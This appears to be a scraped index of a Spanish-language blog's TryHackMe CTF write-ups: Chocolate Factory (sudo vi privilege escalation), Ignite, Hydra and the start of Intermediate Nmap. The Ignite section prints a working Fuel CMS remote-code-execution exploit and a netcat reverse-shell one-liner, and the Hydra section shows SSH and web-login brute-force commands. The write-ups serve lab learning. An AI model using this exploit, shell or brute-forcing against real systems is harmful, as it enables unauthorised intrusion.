&lt;command&gt;\".See \"man sudo_root\" for details.charlie@chocolate-factory:/$Estamos dentro con el usuario charlie. Seguimos.charlie@chocolate-factory:/$charlie@chocolate-factory:/$ cd /home/charliecharlie@chocolate-factory:/home/charlie$ ls -latotal 40drwxr-xr-x 5 charlie charley 4096 Oct 7 2020 .drwxr-xr-x 3 root root 4096 Oct 1 2020 ..-rw-r--r-- 1 charlie charley 3771 Apr 4 2018 .bashrcdrwx------ 2 charlie charley 4096 Sep 1 2020 .cachedrwx------ 3 charlie charley 4096 Sep 1 2020 .gnupgdrwxrwxr-x 3 charlie charley 4096 Sep 29 2020 .local-rw-r--r-- 1 charlie charley 807 Apr 4 2018 .profile-rw-r--r-- 1 charlie charley 1675 Oct 6 2020 teleport-rw-r--r-- 1 charlie charley 407 Oct 6 2020 teleport.pub-rw-r----- 1 charlie charley 39 Oct 6 2020 user.txtcharlie@chocolate-factory:/home/charlie$ cat user.txtflag{&lt;EDITADO&gt;}Obtenemos la flag del usuario. Toca escalar.Escaldo de privilegiosPara esto tiramos de los clásicos.charlie@chocolate-factory:/home/charlie$ sudo -lMatching Defaults entries for charlie on chocolate-factory: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser charlie may run the following commands on chocolate-factory: (ALL : !root) NOPASSWD: /usr/bin/vicharlie@chocolate-factory:/home/charlie$Nos cuentan que podemos ejecutar vi como root.Nos vamos a GTFObins, buscamos por vi y le damos al botoncito sudo.Pues allá que vamos.charlie@chocolate-factory:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null# # ls -latotal 40drwxr-xr-x 5 charlie charley 4096 Oct 7 2020 .drwxr-xr-x 3 root root 4096 Oct 1 2020 ..-rw-r--r-- 1 charlie charley 3771 Apr 4 2018 .bashrcdrwx------ 2 charlie charley 4096 Sep 1 2020 .cachedrwx------ 3 charlie charley 4096 Sep 1 2020 .gnupgdrwxrwxr-x 3 charlie charley 4096 Sep 29 2020 .local-rw-r--r-- 1 charlie charley 807 Apr 4 2018 .profile-rw-r--r-- 1 charlie charley 1675 Oct 6 2020 teleport-rw-r--r-- 1 charlie charley 407 Oct 6 2020 teleport.pub-rw-r----- 1 charlie charley 39 Oct 6 2020 user.txt# cd /root# ls -latotal 40drwx------ 6 root root 4096 Oct 7 2020 .drwxr-xr-x 24 root root 4096 Sep 1 2020 ..-rw------- 1 root root 0 Oct 7 2020 .bash_history-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwx------ 3 root root 4096 Oct 1 2020 .cachedrwx------ 3 root root 4096 Sep 30 2020 .gnupgdrwxr-xr-x 3 root root 4096 Sep 29 2020 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rwxr-xr-x 1 charlie charley 491 Oct 1 2020 root.py-rw-r--r-- 1 root root 66 Sep 30 2020 .selected_editordrwx------ 2 root root 4096 Sep 1 2020 .ssh#Ups !. No nos encotramos con el típico fichero root.txt. En su lugar nos han dejado un root.py. Lo abrimos a ver qué contiene.# cat root.pyfrom cryptography.fernet import Fernetimport pyfigletkey=input(\"Enter the key: \")f=Fernet(key)encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'dcrypt_mess=f.decrypt(encrypted_mess)mess=dcrypt_mess.decode()display1=pyfiglet.figlet_format(\"You Are Now The Owner Of \")display2=pyfiglet.figlet_format(\"Chocolate Factory \")print(display1)print(display2)print(mess)# El script implementa Fernet, un método de encriptación que requiere una clave.Para los que no hayáis detectado la respuesta al primer desafío del room que nos aparecía utilizando strings key_rev_key desde el navegador (es cierto que sale medio oculta), vamos a intentarlo aprovechando el acceso con el que contamos ahora. Volveremos al root.py más adelante.# cd /var/www/html/# ls -latotal 1152drwxr-xr-x 2 root root 4096 Oct 6 2020 .drwxr-xr-x 3 root root 4096 Sep 29 2020 ..-rw-rw-r-- 1 charlie charley 65719 Sep 30 2020 home.jpg-rw-rw-r-- 1 charlie charley 695 Sep 30 2020 home.php-rw-rw-r-- 1 charlie charley 1060347 Sep 30 2020 image.png-rw-rw-r-- 1 charlie charley 1466 Oct 1 2020 index.html-rw-rw-r-- 1 charlie charley 273 Sep 29 2020 index.php.bak-rw-r--r-- 1 charlie charley 8496 Sep 30 2020 key_rev_key-rw------- 1 root root 12288 Oct 1 2020 .swp-rw-rw-r-- 1 charlie charley 303 Sep 30 2020 validate.php# strings key_rev_key/lib64/ld-linux-x86-64.so.2libc.so.6__isoc99_scanfputs[...]Enter your name: laksdhfas congratulations you have found the key: b'-Vk&lt;EDITADO&gt;GSQzY=' Keep its safeBad name!;*3$\"[...].data.bss.comment# OK, hemos conseguido la key que nos pide el script de Python. Probamos.# python root.pyEnter the key: b'-Vk&lt;EDITADO&gt;GSQzY='__ __ _ _ _ _____ _\\ \\ / /__ _ _ / \\ _ __ ___ | \\ | | _____ __ |_ _| |__ ___ \\ V / _ \\| | | | / _ \\ | '__/ _ \\ | \\| |/ _ \\ \\ /\\ / / | | | '_ \\ / _ \\ | | (_) | |_| | / ___ \\| | | __/ | |\\ | (_) \\ V V / | | | | | | __/ |_|\\___/ \\__,_| /_/ \\_\\_| \\___| |_| \\_|\\___/ \\_/\\_/ |_| |_| |_|\\___| ___ ___ __ / _ \\__ ___ __ ___ _ __ / _ \\ / _|| | | \\ \\ /\\ / / '_ \\ / _ \\ '__| | | | | |_| |_| |\\ V V /| | | | __/ | | |_| | _| \\___/ \\_/\\_/ |_| |_|\\___|_| \\___/|_| ____ _ _ _ / ___| |__ ___ ___ ___ | | __ _| |_ ___| | | '_ \\ / _ \\ / __/ _ \\| |/ _` | __/ _ \\| |___| | | | (_) | (_| (_) | | (_| | || __/ \\____|_| |_|\\___/ \\___\\___/|_|\\__,_|\\__\\___| _____ _| ___|_ _ ___| |_ ___ _ __ _ _| |_ / _` |/ __| __/ _ \\| '__| | | || _| (_| | (__| || (_) | | | |_| ||_| \\__,_|\\___|\\__\\___/|_| \\__, | |___/flag{&lt;EDITADO&gt;}#Nos hacemos con la flag de root y resolvemos la sala.Espero que esta guía os haya servido de ayuda.Saludos he intentar ser felices. Nota final: Una vez terminé el room me di cuenta de que había una vía quizás más sencilla para llegar a resolverlo. Os la dejo a continuación.Lanzando un escaneo de ficheros sobre el servidor con feroxbuster obtenemos lo siguiente. (Por cuestiones de sencillez corté el escaneo antes de que terminase)┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]└─$ feroxbuster -u http://10.10.31.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --extensions php txt html --status-codes 200 302 ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben \"epi\" Risher 🤓 ver: 2.7.0───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.59.122 🚀 Threads │ 100 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 302] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.7.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php, txt, html] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────200 GET 69l 131w 1466c http://10.10.59.122/200 GET 69l 131w 1466c http://10.10.59.122/index.html200 GET 32l 48w 569c http://10.10.59.122/home.php200 GET 1l 2w 93c http://10.10.59.122/validate.php🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_59_122-1664275853.state ...[#&gt;------------------] - 7m 110283/1764368 1h found:4 errors:4340 [#&gt;------------------] - 7m 60540/882184 131/s http://10.10.59.122 [#&gt;------------------] - 7m 60296/882184 131/s http://10.10.59.122/ Entre los ficheros que nos descubre esta home.php, el fichero detrás de la página desde la que podemos lanzar comandos directamente, incluída una shell reversa.A partir de aquí, los pasos serían bastante similares a los que hemos visto." }, { "title": "Try Hack Me - Ignite - Writeup", "url": "/posts/thm-writeup-ignite/", "categories": "Try Hack Me", "tags": "thm, writeups", "date": "2022-09-20 03:30:00 +0100", "snippet": "En esta guía vamos a resolver el room Ignite de THM creado por DarkStar7471 en el que nos aprovecharemos de un CMS vulnerable para obtener acceso y escalar privilegios.Dentro música.InicioEn este caso, la información disponible en el room es nula, así que iniciamos la máquina y enumeramos con nmap.Enumeración┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]└─$ RIP=10.10.254.226┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]└─$ nmap -sC -sV $RIPStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 16:36 CESTNmap scan report for 10.10.254.226Host is up (0.077s latency).Not shown: 999 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Welcome to FUEL CMS| http-robots.txt: 1 disallowed entry|_/fuel/Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 24.82 secondsSignificado de las flags: -sC : devuelve información sobre la versión de los servicios corriendo en los puertos abiertos. -sV : realiza un escaneo utilizando el conjunto de scripts por defecto de nmap.El volcado de nmap nos cuenta que tenemos el puerto 80/tcp con un servicio http escuchando. También nos brinda información sobre un directorio exluido en el fichero robot.txt.Cargamos la IP en el navegador y nos muestra lo siguiente:Lo que tenemos aquí es una implementación de Fuel CMS en la versión 1.4.Toca buscar si exite algún exploit conocido para nuestro nuevo amigo. Para ello nos vamos a Exploit Database y encontramos esto: un script en python que nos permite ejecutar código remoto.Lo copiamos y lo guardamos en nuestro directorio de trabajo con el nombre ignite.py .# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)# Date: 2019-07-19# Exploit Author: 0xd0ff9# Vendor Homepage: https://www.getfuelcms.com/# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1# Version: &lt;= 1.4.1# Tested on: Ubuntu - Apache2 - php5# CVE : CVE-2018-16763import requestsimport urlliburl = \"http://127.0.0.1:8881\"def find_nth_overlapping(haystack, needle, n): start = haystack.find(needle) while start &gt;= 0 and n &gt; 1: start = haystack.find(needle, start+1) n -= 1 return startwhile 1:\txxxx = raw_input('cmd:')\tburp0_url = url+\"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27\"+urllib.quote(xxxx)+\"%27%29%2b%27\"\tproxy = {\"http\":\"http://127.0.0.1:8080\"}\tr = requests.get(burp0_url, proxies=proxy)\thtml = \"&lt;!DOCTYPE html&gt;\"\thtmlcharset = r.text.find(html)\tbegin = r.text[0:20]\tdup = find_nth_overlapping(r.text,begin,2)\tprint r.text[0:dup]Le echamos un ojo y vemos que hay un par de cosas que modificar. El valor de la variable url  debe ser el de nuestro servidor remoto. La función raw_input()  ha sido renombrada como input()  en python3. La variable proxy  no la necesitamos. La función print  hay que reescribirla para python3. Tras los cambios, el fichero ignite.py  nos queda tal que así:import requestsimport urlliburl = \"http://10.10.254.226\"def find_nth_overlapping(haystack, needle, n): start = haystack.find(needle) while start &gt;= 0 and n &gt; 1: start = haystack.find(needle, start+1) n -= 1 return startwhile 1:\txxxx = input('cmd:')\tburp0_url = url+\"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27\"+urllib.quote(xxxx)+\"%27%29%2b%27\"\tr = requests.get(burp0_url)\thtml = \"&lt;!DOCTYPE html&gt;\"\thtmlcharset = r.text.find(html)\tbegin = r.text[0:20]\tdup = find_nth_overlapping(r.text,begin,2)\tprint(r.text[0:dup])Lo ejecutamos a ver si funciona┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]└─$ python3 ignite.pycmd:OK. Aprovechando que podemos ejecutar comandos en el servidor remoto, vamos a pedirle que se conecte a nuestra máquina local via netcat al puerto 4433. Para eso utilizamos el siguiente código.rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc &lt;TUNEL_IP&gt; 4433 &gt; /tmp/fDonde &lt;TUNEL_IP&gt;  es la IP con la que nuestro equipo se conecta a THM via VPN. Para saber cuál es podemos ejecutar ip a  en nuestro terminal y echar un ojo a la interface tun0.Abrimos un nuevo terminal en nuestra máquina y ponemos a escuchar a nc.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]└─$ nc -lvp 4433listening on [any] 4433 ...Copiamos el código anterior y lo pegamos en el terminal donde hemos lanzado el script en python.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]└─$ python3 ignite.pycmd:rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.18.xx.xx 4433 &gt; /tmp/fTraceback (most recent call last): File \"/home/ewan67/Documents/Cybersecurity/THM/Ignite/ignite.py\", line 14, in &lt;module&gt; burp0_url = url+\"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27\"+urllib.quote(xxxx)+\"%27%29%2b%27\"AttributeError: module 'urllib' has no attribute 'quote'Malo. Buscamos el error en internet y damos con esto.Toca modificar el fichero.import requestsimport urllib.parseurl = \"http://10.10.254.226\"def find_nth_overlapping(haystack, needle, n): start = haystack.find(needle) while start &gt;= 0 and n &gt; 1: start = haystack.find(needle, start+1) n -= 1 return startwhile 1: xxxx = input('cmd:') burp0_url = url+\"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27\"+urllib.parse.quote(xxxx)+\"%27%29%2b%27\" r = requests.get(burp0_url) html = \"&lt;!DOCTYPE html&gt;\" htmlcharset = r.text.find(html) begin = r.text[0:20] dup = find_nth_overlapping(r.text,begin,2) print(r.text[0:dup])Repetimos.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]└─$ python3 ignite.pycmd:rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.18.xx.xx 4433 &gt; /tmp/fDe momento OK. Nos vamos al terminal donde tenemos escuchando a netcat y esperamos unos segundos.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]└─$ nc -lvp 4433listening on [any] 4433 ...10.10.254.226: inverse host lookup failed: Unknown hostconnect to [10.18.xx.xx] from (UNKNOWN) [10.10.254.226] 55288/bin/sh: 0: can't access tty; job control turned off$ Se hizo la magia. Upgradeamos la shell que tenemos a bash con el comando:python -c 'import pty; pty.spawn(\"/bin/bash\")'Y nos ponemos a trastear.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]└─$ nc -lvp 4433listening on [any] 4433 ...10.10.254.226: inverse host lookup failed: Unknown hostconnect to [10.18.xx.xx] from (UNKNOWN) [10.10.254.226] 55288/bin/sh: 0: can't access tty; job control turned off$ python -c 'import pty; pty.spawn(\"/bin/bash\")'www-data@ubuntu:/var/www/html$ cd /homecd /homewww-data@ubuntu:/home$ lslswww-datawww-data@ubuntu:/home$ cd www-datacd www-datawww-data@ubuntu:/home/www-data$ lslsflag.txtwww-data@ubuntu:/home/www-data$ cat flag.txtcat flag.txt&lt;MODIFICADO&gt;www-data@ubuntu:/home/www-data$Tenemos la primer flag.Escalado de privilegiosDespués de probar varias cosas sin éxito me doy de narices con el siguiente párrafo de la home del CMS. Después de crear la base de datos, cambie la configuración de la base de datos que se encuentra en fuel/application/config/database.php para incluir su nombre de host (por ejemplo, localhost), nombre de usuario, contraseña y la base de datos para que coincida con la nueva base de datos que ha creado.Vamos para allí.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]└─$ nc -lvp 4433listening on [any] 4433 ...[...]www-data@ubuntu:/home/www-data$www-data@ubuntu:/home/www-data$ cd /var/www/html/fuel/application/configcd /var/www/html/fuel/application/configwww-data@ubuntu:/var/www/html/fuel/application/config$ lslsMY_config.php constants.php google.php profiler.phpMY_fuel.php custom_fields.php hooks.php redirects.phpMY_fuel_layouts.php database.php index.html routes.phpMY_fuel_modules.php doctypes.php memcached.php smileys.phpasset.php editors.php migration.php social.phpautoload.php environments.php mimes.php states.phpconfig.php foreign_chars.php model.php user_agents.phpwww-data@ubuntu:/var/www/html/fuel/application/config$ cat /var/www/html/fuel/application/config/database.php&lt;$ cat /var/www/html/fuel/application/config/database.php&lt;?phpdefined('BASEPATH') OR exit('No direct script access allowed');/*| -------------------------------------------------------------------| DATABASE CONNECTIVITY SETTINGS| -------------------------------------------------------------------| This file will contain the settings needed to access your database.|| For complete instructions please consult the 'Database Connection'| page of the User Guide.|| -------------------------------------------------------------------| EXPLANATION OF VARIABLES| -------------------------------------------------------------------|[...]|| The $active_group variable lets you choose which connection group to| make active. By default there is only one group (the 'default' group).|| The $query_builder variables lets you determine whether or not to load| the query builder class.*/$active_group = 'default';$query_builder = TRUE;$db['default'] = array( 'dsn' =&gt; '', 'hostname' =&gt; 'localhost', 'username' =&gt; 'root', 'password' =&gt; '&lt;MODIFICADO&gt;', 'database' =&gt; 'fuel_schema', 'dbdriver' =&gt; 'mysqli', 'dbprefix' =&gt; '', 'pconnect' =&gt; FALSE, 'db_debug' =&gt; (ENVIRONMENT !== 'production'), 'cache_on' =&gt; FALSE, 'cachedir' =&gt; '', 'char_set' =&gt; 'utf8', 'dbcollat' =&gt; 'utf8_general_ci', 'swap_pre' =&gt; '', 'encrypt' =&gt; FALSE, 'compress' =&gt; FALSE, 'stricton' =&gt; FALSE, 'failover' =&gt; array(), 'save_queries' =&gt; TRUE);// used for testing purposesif (defined('TESTING')){ @include(TESTER_PATH.'config/tester_database'.EXT);}www-data@ubuntu:/var/www/html/fuel/application/config$Bingo !www-data@ubuntu:/var/www/html/fuel/application/config$ su rootsu rootPassword: &lt;MODIFICADO&gt;root@ubuntu:/var/www/html/fuel/application/config# lslsasset.php editors.php migration.php profiler.phpautoload.php environments.php mimes.php redirects.phpconfig.php foreign_chars.php model.php routes.phpconstants.php google.php MY_config.php smileys.phpcustom_fields.php hooks.php MY_fuel_layouts.php social.phpdatabase.php index.html MY_fuel_modules.php states.phpdoctypes.php memcached.php MY_fuel.php user_agents.phproot@ubuntu:/var/www/html/fuel/application/config# cdcdroot@ubuntu:~# lslsroot.txtroot@ubuntu:~# cat root.txtcat root.txt&lt;MODIFICADO&gt;root@ubuntu:~#Nos hacemos con la flag de root y final de la peli.Espero que esta guía os haya servido de ayuda.Saludos he intentar ser felices." }, { "title": "Try Hack Me - Hydra - Writeup", "url": "/posts/thm-writeup-hydra/", "categories": "Try Hack Me", "tags": "thm, writeups", "date": "2022-09-20 02:30:00 +0100", "snippet": "En esta guía vamos a resolver el room Hydra de THM creado por cmnatic en el que utilizaremos hydra como herramienta (no se podía saber).Dentro música.InicioPara empezar, nos leemos con atención la descripción que acompaña la tarea 2 del room en la cual nos dan: las claves de los comandos que deberemos utilizar. el nombre de un usuario.Iniciamos la máquina y enumeramos con nmap.EnumeraciónEn este caso, tiramos de la flag -A  para hacer un escaneo completo.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Hydra]└─$ nmap -A 10.10.192.81 -oN nmap_output Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 14:59 CESTNmap scan report for 10.10.192.81Host is up (0.035s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 c2:e5:6c:35:f3:62:07:77:d7:af:37:b9:b2:c8:5e:22 (RSA)| 256 ef:61:6c:5e:04:db:87:61:02:60:0e:9e:d5:06:9f:9c (ECDSA)|_ 256 56:7e:6b:54:4c:26:22:ec:f4:1c:23:ed:85:b6:b2:34 (ED25519)80/tcp open http Node.js Express framework| http-title: Hydra Challenge|_Requested resource was /loginService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 10.40 secondsSignificado de las flags: -A : escaneo completo (ejecuta OS detection, version detection, script scanning y traceroute) -oN : imprime la salida en un fichero de texto con el nombre nmap_outputEl volcado de nmap nos cuenta que tenemos dos puertos abiertos: 22/tcp con un servicio ssh escuchando. 80/tcp con un servicio http escuchando.HTTPAbrimos un navegador y cargamos la IP del room.Nos aparece la página de login.OK. En una nueva ventana de terminal buscamos un diccionario para utilizar con hydra contando con que tenemos un nombre de usuario. Tip: Leeros el Hint de la primer pregunta. Yo no lo hice.┌──(ewan67㉿kali)-[~]└─$ cd /usr/share/seclists/┌──(ewan67㉿kali)-[/usr/share/seclists]└─$ ls Discovery Fuzzing IOCs Miscellaneous Passwords Pattern-Matching Payloads README.md Usernames Web-Shells┌──(ewan67㉿kali)-[/usr/share/seclists]└─$ cd Passwords ┌──(ewan67㉿kali)-[/usr/share/seclists/Passwords]└─$ ls -latotal 258624drwxr-xr-x 12 root root 12288 Aug 3 08:19 .drwxr-xr-x 11 root root 4096 Aug 3 08:19 ..-rw-r--r-- 1 root root 1621 Aug 2 11:51 2020-200_most_used_passwords.txt[...]Me quedo con el primero, 2020-200_most_used_passwords  suena suficiente para empezar.Volvemos al terminal de la carpeta de trabajo y lanzamos hydra.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Hydra]└─$ hydra -l molly -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt 10.10.192.81 http-post-form \"/login:username=^USER^&amp;password=^PASS^:F=incorrect\" -VHydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-20 15:33:15[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task[DATA] attacking http-post-form://10.10.192.81:80/login:username=^USER^&amp;password=^PASS^:F=incorrect[ATTEMPT] target 10.10.192.81 - login \"molly\" - pass \"123456\" - 1 of 200 [child 0] (0/0)[ATTEMPT] target 10.10.192.81 - login \"molly\" - pass \"123456789\" - 2 of 200 [child 1] (0/0)[...][ATTEMPT] target 10.10.192.81 - login \"molly\" - pass \"12345678\" - 5 of 200 [child 4] (0/0)[ATTEMPT] target 10.10.192.81 - login \"molly\" - pass \"aaaaaa\" - 59 of 200 [child 2] (0/0)[80][http-post-form] host: 10.10.192.81 login: molly password: &lt;MODIFICADO&gt;1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-20 15:33:19Volvemos al navegador, introducimos las credenciales y obtenemos la primer flag.Vamos a por la segunda.SSHCon la lección aprendida, cambiamos de diccionario y lanzamos el comando correspondiente al ssh.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Hydra]└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.192.81 ssh -VHydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-20 15:59:18[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task[DATA] attacking ssh://10.10.192.81:22/[ATTEMPT] target 10.10.192.81 - login \"molly\" - pass \"123456\" - 1 of 14344399 [child 0] (0/0)[ATTEMPT] target 10.10.192.81 - login \"molly\" - pass \"12345\" - 2 of 14344399 [child 1] (0/0)[...][ATTEMPT] target 10.10.192.81 - login \"molly\" - pass \"jordan\" - 35 of 14344400 [child 4] (0/1)[ATTEMPT] target 10.10.192.81 - login \"molly\" - pass \"liverpool\" - 36 of 14344400 [child 11] (0/1)[22][ssh] host: 10.10.192.81 login: molly password: &lt;MODIFICADO&gt;1 of 1 target successfully completed, 1 valid password found[WARNING] Writing restore file because 1 final worker threads did not complete until end.[ERROR] 1 target did not resolve or could not be connected[ERROR] 0 target did not completeHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-20 15:59:26Tenemos la contraseña. Conectamos por ssh.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Hydra]└─$ ssh molly@10.10.192.81molly@10.10.192.81's password:Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage65 packages can be updated.32 updates are security updates.Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98molly@ip-10-10-192-81:~$ lsflag2.txtmolly@ip-10-10-192-81:~$ cat flag2.txt THM{&lt;MODIFICADO&gt;}molly@ip-10-10-192-81:~$ Segunda flag y final de show.Espero que esta guía os haya resultado de ayuda.Sed buenos si no hay una opción mejor." }, { "title": "Try Hack Me - Intermediate Nmap - Writeup", "url": "/posts/thm-writeup-intermediate-nmap/", "categories": "Try Hack Me", "tags": "thm, writeups", "date": "2022-09-19 02:30:00 +0100", "snippet": "En esta guía vamos a trabajar con el room Intermediate Nmap de THM cuyo autor es cmnatic. Se trata de un CTF de nivel Easy realmente sencillo en el que utilizaremos herramientas como nmap, netcat y sobre todo pondremos a prueba nuestra capacidad de observación.Dentro música.InicioPara empezar, nos leemos con atención la descripción que acompaña el room. Os la dejo traducida: Has aprendido algunas habilidades de nmap . ¿Ahora puedes combinar eso con otras habilidades con netcat  y protocolos, para entrar en ésta máquina y encontrar la bandera? ¡Esta VM está escuchando en un puerto alto, y si te conectas a él puede darte alguna información que puedes usar para conectarte a un puerto más bajo comúnmente usado para acceso remoto!Bueno, lo cierto es que parecen pocas pistas, pero en breve veremos que son todas las que necesitamos para resolver el room. El autor nos da la siguiente información: La máquina esta escuchando en un puerto alto. Si nos conectamos a él obtendremos información para conectarnos a un servicio comúnmente usado para acceso remoto corriendo en un puerto más bajo. Debemos aprovechar nuestros conocimientos de nmap y netcat.EnumeraciónPues vamos a ello. Empezamos lanzando un escaneo con nmap:┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/IntermediateNmap]└─$ nmap -sC -sV -p- 10.10.227.18 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 15:53 CESTNmap scan report for 10.10.227.18Host is up (0.035s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 7d:dc:eb:90:e4:af:33:d9:9f:0b:21:9a:fc:d5:77:f2 (RSA)| 256 83:a7:4a:61:ef:93:a3:57:1a:57:38:5c:48:2a:eb:16 (ECDSA)|_ 256 30:bf:ef:94:08:86:07:00:f7:fc:df:e8:ed:fe:07:af (ED25519)2222/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 28:06:ca:9e:c1:d2:39:07:f6:b3:54:99:2c:e4:c9:0e (RSA)| 256 25:6c:68:0c:2d:ec:fa:2e:78:12:03:a1:aa:5c:b9:16 (ECDSA)|_ 256 98:e9:a2:b3:bf:33:45:cb:77:3b:c6:9c:60:30:f2:b4 (ED25519)31337/tcp open Elite?| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: | In case I forget - user:pass|_ &lt;REDACTADO&gt;:&lt;REDACTADO&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port31337-TCP:V=7.92%I=7%D=9/19%Time=63287472%P=x86_64-pc-linux-gnu%r(NSF:ULL,35,\"In\\x20case\\x20I\\x20forget\\x20-\\x20user:pass\\n&lt;REDACTADO&gt;:&lt;REDACTADO&gt;[...]SF:&lt;REDACTADO&gt;\\n\\n\")%r(TerminalServer,35,\"In\\x20case\\x20I\\x20forget\\x2SF:0-\\x20user:pass\\n&lt;REDACTADO&gt;:&lt;REDACTADO&gt;\\n\\n\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 33.92 secondsSignificado de las flags: -sC : devuelve información sobre la versión de los servicios corriendo en los puertos abiertos. -sV : realiza un escaneo utilizando el conjunto de scripts por defecto de nmap. -p- : escanea los 65535 puertos. -oN : imprime la salida en un fichero de texto con el nombre nmap_outputAtentos a la descripción, incluímos la flag -p-  para que nmap escanée todos los puertos.El volcado de nmap nos cuenta 